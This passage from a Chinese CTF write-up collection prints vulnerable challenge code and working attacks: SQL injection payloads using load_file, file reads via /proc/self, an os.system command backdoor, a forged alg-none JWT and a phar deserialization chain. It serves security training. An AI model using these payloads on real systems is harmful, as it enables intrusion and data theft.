\u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); $result = $db-\u0026gt;query(\u0026#39;delete from `user` where `user_id`=\u0026#39; . $row[\u0026#34;user_id\u0026#34;]); if(!$result) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;订单删除成功\u0026#34;; } else { $msg = \u0026#34;未找到订单!\u0026#34;; } }else { $msg = \u0026#34;信息不全\u0026#34;; } ?\u0026gt; config.php：\n\u0026lt;?php ini_set(\u0026#34;open_basedir\u0026#34;, getcwd() . \u0026#34;:/etc:/tmp\u0026#34;); $DATABASE = array( \u0026#34;host\u0026#34; =\u0026gt; \u0026#34;127.0.0.1\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, \u0026#34;dbname\u0026#34; =\u0026gt;\u0026#34;ctfusers\u0026#34; ); $db = new mysqli($DATABASE[\u0026#39;host\u0026#39;],$DATABASE[\u0026#39;username\u0026#39;],$DATABASE[\u0026#39;password\u0026#39;],$DATABASE[\u0026#39;dbname\u0026#39;]); change.php中未对address进行过滤，尝试注入点为address的二次注入＋报错注入，用户权限为root，可以load_file：\n1\u0026#34;\u0026#39; and updatexml(1,concat(0x7e,database()),1)#\rerrorXPATH syntax error: \u0026#39;~ctfusers\u0026#39;\r1\u0026#34;\u0026#39; and updatexml(1,concat(0x7e,(select load_file(\u0026#34;/flag.txt\u0026#34;))),1)#\rerrorXPATH syntax error: \u0026#39;~flag{9f15a769-7b93-45f5-add5-3d\u0026#39;\r1\u0026#34;\u0026#39; and updatexml(1,concat(0x7e,substr((select load_file(\u0026#34;/flag.txt\u0026#34;)),30)),1)#\rerrorXPATH syntax error: \u0026#39;~3dbf4a23b76f} flag{9f15a769-7b93-45f5-add5-3dbf4a23b76f}\n[网鼎杯 2020 白虎组]PicDown url是个任意文件读取，先从环境变量获取工作目录/proc/self/environ：\nPWD=/app /app/app.py：\nfrom flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = \u0026#34;/tmp/secret.txt\u0026#34; f = open(SECRET_FILE) SECRET_KEY = f.read().strip() os.remove(SECRET_FILE) @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;search.html\u0026#39;) @app.route(\u0026#39;/page\u0026#39;) def page(): url = request.args.get(\u0026#34;url\u0026#34;) try: if not url.lower().startswith(\u0026#34;file\u0026#34;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=\u0026#39;application/octet-stream\u0026#39;) response.headers[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=beautiful.jpg\u0026#39; return response else: value = \u0026#34;HACK ERROR!\u0026#34; except: value = \u0026#34;SOMETHING WRONG!\u0026#34; return render_template(\u0026#39;search.html\u0026#39;, res=value) @app.route(\u0026#39;/no_one_know_the_manager\u0026#39;) def manager(): key = request.args.get(\u0026#34;key\u0026#34;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(\u0026#34;shell\u0026#34;) os.system(shell) res = \u0026#34;ok\u0026#34; else: res = \u0026#34;Wrong Key!\u0026#34; return res if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) 未关闭SECRET_FILE的文件流，利用fd仍然可以读取该文件内容，/proc/self/fd/3：\nPExSWPFkA1V0CvVHVBjiLwoewfZT8tz2ERO30FehoiQ= os.system命令执行的结果不会输出到网页，尝试将命令结果保存到/tmp目录下：\nls / | cat \u0026gt; /tmp/1.txt 发现根目录下有flag文件：flag{76d21877-ab9e-41dd-973e-28ac68487ed4}\n[b01lers2020]Welcome to Earth 一直跳转，看每个网页的js和源码就行，/static/js/fight.js：\n// Run to scramble original flag //console.log(scramble(flag, action)); function scramble(flag, key) { for (var i = 0; i \u0026lt; key.length; i++) { let n = key.charCodeAt(i) % flag.length; let temp = flag[i]; flag[i] = flag[n]; flag[n] = temp; } return flag; } function check_action() { var action = document.getElementById(\u0026#34;action\u0026#34;).value; var flag = [\u0026#34;{hey\u0026#34;, \u0026#34;_boy\u0026#34;, \u0026#34;aaaa\u0026#34;, \u0026#34;s_im\u0026#34;, \u0026#34;ck!}\u0026#34;, \u0026#34;_baa\u0026#34;, \u0026#34;aaaa\u0026#34;, \u0026#34;pctf\u0026#34;]; // TODO: unscramble function } 看格式猜出flag：pctf{hey_boys_im_baaaaaaaaaack!}\nOctober 2019 Twice SQL Injection 二次注入，登录成功有个Info，猜测后端语句是：\nselect Info from table_name where username=\u0026#39;\u0026#39; 或select Info from table_name where username=\u0026#39;\u0026#39; and password=\u0026#39;\u0026#39; 注册用户时将username设置为联合注入语句：\nusername=1\u0026#39; union select database() #\rctftraining\rusername=1\u0026#39; union select group_concat(table_name) from information_schema.tables where table_schema=database() #\rflag,news,users\rusername=1\u0026#39; union select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39; #\rflag\rusername=1\u0026#39; union select flag from flag #\rflag{5bbcd66f-a075-4532-bfce-6aa8642e41f3} 也可以先看看sql用户权限，如果是root直接可以load_file：\nusername=1\u0026#39; union select user() #\rroot@localhost\rusername=1\u0026#39; union select load_file(\u0026#39;/var/www/html/index.php\u0026#39;) # index.php：\n\u0026lt;?php error_reporting(0); session_start(); /** * Database mysql */ $db_host = \u0026#34;127.0.0.1\u0026#34;; $db_user = $db_pass = \u0026#34;root\u0026#34;; $db_name = \u0026#34;ctftraining\u0026#34;; $conn = mysql_connect($db_host, $db_user, $db_pass) or die(\u0026#39;Could not connect: \u0026#39; . mysql_error()); mysql_select_db($db_name, $conn) or die(\u0026#39;Could select database: \u0026#39; . mysql_error()); register_shutdown_function(function () { global $conn; mysql_close($conn); }); function query($sql) { $result = mysql_query($sql); $rows = mysql_fetch_assoc($result); return $rows; } /** * Main */ $action = isset($_GET[\u0026#39;action\u0026#39;]) ? $_GET[\u0026#39;action\u0026#39;] : \u0026#34;index\u0026#34;; if (!in_array($action, [\u0026#39;login\u0026#39;, \u0026#39;reg\u0026#39;]) \u0026amp;\u0026amp; !isset($_SESSION[\u0026#39;username\u0026#39;])) { header(\u0026#34;Location: /?action=login\u0026#34;); exit; } switch ($action) { case \u0026#39;login\u0026#39;: if (isset($_POST[\u0026#39;username\u0026#39;])) { $username = addslashes($_POST[\u0026#39;username\u0026#39;]); $password = md5($_POST[\u0026#39;password\u0026#39;]); $res = query(\u0026#34;select * from users where username=\u0026#39;{$username}\u0026#39; and password=\u0026#39;{$password}\u0026#39;;\u0026#34;); if ($res) { $_SESSION[\u0026#39;username\u0026#39;] = $res[\u0026#39;username\u0026#39;]; header(\u0026#34;Location: /?action=index\u0026#34;); exit; } } ?\u0026gt; \u0026lt;h1\u0026gt;Login\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;/?action=login\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; Username : \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;br\u0026gt; Password : \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;/?action=reg\u0026#34;\u0026gt;Go to Register\u0026lt;/a\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php break; case \u0026#39;reg\u0026#39;: if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;username\u0026#39;] != \u0026#34;\u0026#34;) { $username = addslashes($_POST[\u0026#39;username\u0026#39;]); $password = md5($_POST[\u0026#39;password\u0026#39;]); if (mysql_query(\u0026#34;insert into users(username,password,info) values (\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;,\u0026#39;十月太懒，没有简介\u0026#39;);\u0026#34;)) { header(\u0026#34;Location: /?action=login\u0026#34;); } else { header(\u0026#34;Location: /?action=reg\u0026amp;msg=注册失败\u0026#34;); } exit; } else { ?\u0026gt; \u0026lt;h1\u0026gt;Register\u0026lt;/h1\u0026gt; \u0026lt;div\u0026gt;\u0026lt;?=addslashes($_GET[\u0026#39;msg\u0026#39;]);?\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;form action=\u0026#34;/?action=reg\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; Username : \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;br\u0026gt; Password : \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;/?action=login\u0026#34;\u0026gt;Go to Login\u0026lt;/a\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Register\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } break; case \u0026#39;change\u0026#39;: if (isset($_POST[\u0026#39;info\u0026#39;])) { $info = addslashes($_POST[\u0026#39;info\u0026#39;]); if (mysql_query(\u0026#34;update users set info=\u0026#39;{$info}\u0026#39; where username=\u0026#39;{$_SESSION[\u0026#39;username\u0026#39;]}\u0026#39;;\u0026#34;)) { header(\u0026#34;Location: /?action=index\u0026#34;); } else { header(\u0026#34;Location: /?action=change\u0026amp;msg=修改失败\u0026#34;); } exit; } break; case \u0026#39;logout\u0026#39;: session_destroy(); header(\u0026#34;Location: /?action=login\u0026#34;); exit; break; case \u0026#39;index\u0026#39;: default: $info = query(\u0026#34;select info from users where username=\u0026#39;{$_SESSION[\u0026#39;username\u0026#39;]}\u0026#39;;\u0026#34;); ?\u0026gt; \u0026lt;h1\u0026gt;Info\u0026lt;/h1\u0026gt; \u0026lt;div\u0026gt;\u0026lt;?=addslashes($info[\u0026#39;info\u0026#39;]);?\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;div\u0026gt;\u0026lt;?=addslashes($_GET[\u0026#39;msg\u0026#39;]);?\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;form action=\u0026#34;/?action=change\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; Info : \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;info\u0026#34;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Change\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;a href=\u0026#34;/?action=logout\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt; \u0026lt;?php break; } echo \u0026#34;\u0026lt;!-- October nb!!!!! --\u0026gt;\u0026#34;; [HFCTF2020]EasyLogin 查看app.js发现一段注释：\n/** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */ koa是基于nodejs的web框架，有固定的目录结构，/controllers/api.js：\nconst crypto = require(\u0026#39;crypto\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;) const jwt = require(\u0026#39;jsonwebtoken\u0026#39;) const APIError = require(\u0026#39;../rest\u0026#39;).APIError; module.exports = { \u0026#39;POST /api/register\u0026#39;: async (ctx, next) =\u0026gt; { const {username, password} = ctx.request.body; if(!username || username === \u0026#39;admin\u0026#39;){ throw new APIError(\u0026#39;register error\u0026#39;, \u0026#39;wrong username\u0026#39;); } if(global.secrets.length \u0026gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString(\u0026#39;hex\u0026#39;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: \u0026#39;HS256\u0026#39;}); ctx.rest({ token: token }); await next(); }, \u0026#39;POST /api/login\u0026#39;: async (ctx, next) =\u0026gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError(\u0026#39;login error\u0026#39;, \u0026#39;username or password is necessary\u0026#39;); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(\u0026#39;.\u0026#39;)[1], \u0026#39;base64\u0026#39;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid \u0026lt; global.secrets.length \u0026amp;\u0026amp; sid \u0026gt;= 0)) { throw new APIError(\u0026#39;login error\u0026#39;, \u0026#39;no such secret id\u0026#39;); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: \u0026#39;HS256\u0026#39;}); const status = username === user.username \u0026amp;\u0026amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, \u0026#39;GET /api/flag\u0026#39;: async (ctx, next) =\u0026gt; { if(ctx.session.username !== \u0026#39;admin\u0026#39;){ throw new APIError(\u0026#39;permission error\u0026#39;, \u0026#39;permission denied\u0026#39;); } const flag = fs.readFileSync(\u0026#39;/flag\u0026#39;).toString(); ctx.rest({ flag }); await next(); }, \u0026#39;GET /api/logout\u0026#39;: async (ctx, next) =\u0026gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); } }; 可以将alg置为none，但是有对sid的限制，不能是undefined 或 null且必须满足0 ≤ sid \u0026lt; global.secrets.length，空数组绕过：\nusername=admin\u0026amp;password=12345\u0026amp;authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1IiwiaWF0IjoxNzU0MjAzOTA3fQ.\rSet-Cookie: sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTc1NDI5NjI2NDI1NywiX21heEFnZSI6ODY0MDAwMDB9; path=/; expires=Mon, 04 Aug 2025 08:31:04 GMT; httponly\rSet-Cookie: sses:aok.sig=w4pfPZYLt2rCMLMnOCIp_BePdnU; path=/; 带着相应的cookie访问/api/flag，拿到flag：flag{a027f724-d12f-4dd7-b6ba-04132dfc38bb}\n[CISCN2019 华北赛区 Day1 Web1]Dropbox download.php存在任意文件下载，index.php：\n\u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1, shrink-to-fit=no\u0026#34;\u0026gt; \u0026lt;title\u0026gt;网盘管理\u0026lt;/title\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;static/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;static/css/panel.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;static/js/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;static/js/bootstrap.bundle.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;static/js/toast.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;static/js/panel.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav aria-label=\u0026#34;breadcrumb\u0026#34;\u0026gt; \u0026lt;ol class=\u0026#34;breadcrumb\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;breadcrumb-item active\u0026#34;\u0026gt;管理面板\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;breadcrumb-item active\u0026#34;\u0026gt;\u0026lt;label for=\u0026#34;fileInput\u0026#34; class=\u0026#34;fileLabel\u0026#34;\u0026gt;上传文件\u0026lt;/label\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;active ml-auto\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;你好 \u0026lt;?php echo $_SESSION[\u0026#39;username\u0026#39;]?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;fileInput\u0026#34; class=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;top\u0026#34; id=\u0026#34;toast-container\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;?php include \u0026#34;class.php\u0026#34;; $a = new FileList($_SESSION[\u0026#39;sandbox\u0026#39;]); $a-\u0026gt;Name(); $a-\u0026gt;Size(); ?\u0026gt; class.php：\n\u0026lt;?php error_reporting(0); $dbaddr = \u0026#34;127.0.0.1\u0026#34;; $dbuser = \u0026#34;root\u0026#34;; $dbpass = \u0026#34;root\u0026#34;; $dbname = \u0026#34;dropbox\u0026#34;; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-\u0026gt;db = $db; } public function user_exist($username) { $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;store_result(); $count = $stmt-\u0026gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password . \u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $username, $password); $stmt-\u0026gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password . \u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `password` FROM `users` WHERE `username` = ?;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;bind_result($expect); $stmt-\u0026gt;fetch(); if (isset($expect) \u0026amp;\u0026amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-\u0026gt;db-\u0026gt;close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-\u0026gt;files = array(); $this-\u0026gt;results = array(); $this-\u0026gt;funcs = array(); $filenames = scandir($path); $key = array_search(\u0026#34;.\u0026#34;, $filenames); unset($filenames[$key]); $key = array_search(\u0026#34;..\u0026#34;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-\u0026gt;open($path . $filename); array_push($this-\u0026gt;files, $file); $this-\u0026gt;results[$file-\u0026gt;name()] = array(); } } public function __call($func, $args) { array_push($this-\u0026gt;funcs, $func); foreach ($this-\u0026gt;files as $file) { $this-\u0026gt;results[$file-\u0026gt;name()][$func] = $file-\u0026gt;$func(); } } public function __destruct() { $table = \u0026#39;\u0026lt;div id=\u0026#34;container\u0026#34; class=\u0026#34;container\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;table-responsive\u0026#34;\u0026gt;\u0026lt;table id=\u0026#34;table\u0026#34; class=\u0026#34;table table-bordered table-hover sm-font\u0026#34;\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;thead\u0026gt;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($this-\u0026gt;funcs as $func) { $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($func) . \u0026#39;\u0026lt;/th\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;Opt\u0026lt;/th\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/thead\u0026gt;\u0026lt;tbody\u0026gt;\u0026#39;; foreach ($this-\u0026gt;results as $filename =\u0026gt; $result) { $table .= \u0026#39;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($result as $func =\u0026gt; $value) { $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($value) . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34; filename=\u0026#34;\u0026#39; . htmlentities($filename) . \u0026#39;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;download\u0026#34;\u0026gt;下载\u0026lt;/a\u0026gt; / \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;delete\u0026#34;\u0026gt;删除\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;; } echo $table; } } class File { public $filename; public function open($filename) { $this-\u0026gt;filename = $filename; if (file_exists($filename) \u0026amp;\u0026amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-\u0026gt;filename); } public function size() { $size = filesize($this-\u0026gt;filename); $units = array(\u0026#39; B\u0026#39;, \u0026#39; KB\u0026#39;, \u0026#39; MB\u0026#39;, \u0026#39; GB\u0026#39;, \u0026#39; TB\u0026#39;); for ($i = 0; $size \u0026gt;= 1024 \u0026amp;\u0026amp; $i \u0026lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-\u0026gt;filename); } public function close() { return file_get_contents($this-\u0026gt;filename); } } ?\u0026gt; upload.php：\n\u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } include \u0026#34;class.php\u0026#34;; if (isset($_FILES[\u0026#34;file\u0026#34;])) { $filename = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $pos = strrpos($filename, \u0026#34;.\u0026#34;); if ($pos !== false) { $filename = substr($filename, 0, $pos); } $fileext = \u0026#34;.gif\u0026#34;; switch ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;]) { case \u0026#39;image/gif\u0026#39;: $fileext = \u0026#34;.gif\u0026#34;; break; case \u0026#39;image/jpeg\u0026#39;: $fileext = \u0026#34;.jpg\u0026#34;; break; case \u0026#39;image/png\u0026#39;: $fileext = \u0026#34;.png\u0026#34;; break; default: $response = array(\u0026#34;success\u0026#34; =\u0026gt; false, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;Only gif/jpg/png allowed\u0026#34;); Header(\u0026#34;Content-type: application/json\u0026#34;); echo json_encode($response); die(); } if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; strlen($filename) !== 0) { $dst = $_SESSION[\u0026#39;sandbox\u0026#39;] . $filename . $fileext; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], $dst); $response = array(\u0026#34;success\u0026#34; =\u0026gt; true, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;\u0026#34;); Header(\u0026#34;Content-type: application/json\u0026#34;); echo json_encode($response); } else { $response = array(\u0026#34;success\u0026#34; =\u0026gt; false, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;Invaild filename\u0026#34;); Header(\u0026#34;Content-type: application/json\u0026#34;); echo json_encode($response); } } ?\u0026gt; download.php：\n\u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; ini_set(\u0026#34;open_basedir\u0026#34;, getcwd() . \u0026#34;:/etc:/tmp\u0026#34;); chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename) \u0026amp;\u0026amp; stristr($filename, \u0026#34;flag\u0026#34;) === false) { Header(\u0026#34;Content-type: application/octet-stream\u0026#34;); Header(\u0026#34;Content-Disposition: attachment; filename=\u0026#34; . basename($filename)); echo $file-\u0026gt;close(); } else { echo \u0026#34;File not exist\u0026#34;; } ?\u0026gt; delete.php：\n\u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename)) { $file-\u0026gt;detele(); Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; true, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;\u0026#34;); echo json_encode($response); } else { Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; false, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;File not exist\u0026#34;); echo json_encode($response); } ?\u0026gt; 根据class.php进行phar的构造：\n\u0026lt;?php class User { public $db; } class FileList { private $files; private $results; private $funcs; public function __construct() { $this-\u0026gt;files = array(); $this-\u0026gt;results = array(); $this-\u0026gt;funcs = array(); $file = new File(); array_push($this-\u0026gt;files, $file); $this-\u0026gt;results[$file-\u0026gt;name()] = array(); } } class File { public $filename = \u0026#34;/flag.txt\u0026#34;; public function name() { return basename($this-\u0026gt;filename); } } $obj = new User(); $obj-\u0026gt;db = new FileList(); @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#39;phar.phar\u0026#39;); $phar -\u0026gt; stopBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $phar -\u0026gt; setMetadata($obj); $phar -\u0026gt; stopBuffering(); ?\u0026gt; 改后缀为.gif上传，delete.php会调用class.php中delete函数的unlink，download.php会调用class.php中open函数的file_exists，但是download.php中存在open_basedir，限制了获取范围，只有delete才能获取/flag.txt：\n[SWPUCTF 2018]SimplePHP function.php：\n\u0026lt;?php //show_source(__FILE__); include \u0026#34;base.php\u0026#34;; header(\u0026#34;Content-type: text/html;charset=utf-8\u0026#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;].$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]).\u0026#34;.jpg\u0026#34;; //mkdir(\u0026#34;upload\u0026#34;,0777); if(file_exists(\u0026#34;upload/\u0026#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $filename); echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;上传成功!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\u0026#34;gif\u0026#34;,\u0026#34;jpeg\u0026#34;,\u0026#34;jpg\u0026#34;,\u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $extension = end($temp); if(empty($extension)) { //echo \u0026#34;\u0026lt;h4\u0026gt;请选择上传的文件:\u0026#34; . \u0026#34;\u0026lt;h4/\u0026gt;\u0026#34;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;Invalid file!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; return false; } } } ?\u0026gt; upload_file.php：\n\u0026lt;?php include \u0026#39;function.php\u0026#39;; upload_file(); ?\u0026gt; base.php：\n\u0026lt;?php echo $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;];?\u0026gt; index.php：\n\u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;base.php\u0026#39;; ?\u0026gt; file.php：\n\u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;function.php\u0026#39;; include \u0026#39;class.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/var/www/html/\u0026#39;); $file = $_GET[\u0026#34;file\u0026#34;] ? $_GET[\u0026#39;file\u0026#39;] : \u0026#34;\u0026#34;; if(empty($file)) { echo \u0026#34;\u0026lt;h2\u0026gt;There is no file to show!\u0026lt;h2/\u0026gt;\u0026#34;; } $show = new Show(); if(file_exists($file)) { $show-\u0026gt;source = $file; $show-\u0026gt;_show(); } else if 